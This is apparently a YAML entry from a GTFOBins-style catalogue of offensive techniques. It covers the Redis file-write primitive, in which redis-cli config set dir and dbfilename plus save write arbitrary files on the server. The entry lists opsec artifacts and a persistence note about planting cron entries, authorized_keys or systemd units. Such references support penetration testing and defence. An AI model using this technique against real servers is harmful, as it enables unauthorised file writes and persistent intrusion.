---
name: redis
capabilities:
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: low
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    redis-cli -h 127.0.0.1
    config set dir /path/to/output-dir/
    config set dbfilename output-file
    set x "DATA"
    save
  notes: |-
    Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.

    Keep in mind that it's actually the server to perform the file write.
references:
- https://gtfobins.github.io/gtfobins/redis/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
